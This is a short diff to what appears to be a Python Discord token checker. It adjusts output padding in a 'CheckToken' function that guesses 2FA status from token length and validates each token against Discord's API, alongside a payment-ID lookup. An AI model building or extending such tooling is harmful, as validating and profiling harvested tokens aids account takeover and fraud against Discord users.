@@ -73,10 +73,10 @@ def get_payment_id(token: str):
 def CheckToken(token):
     if len(token) > 59:
         lenght = " 2fa: Yes"
-        lenghtToken = f"{token}                             "
+        lenghtToken = f"{token}"
     else:
         lenght = " 2fa: No"
-        lenghtToken = f"{token}"
+        lenghtToken = f"{token}                             "
     req = requests.get("https://discordapp.com/api/v7/users/@me?verified", headers={'authorization': token})
     if req.status_code == 401:
         #Invalid tokens
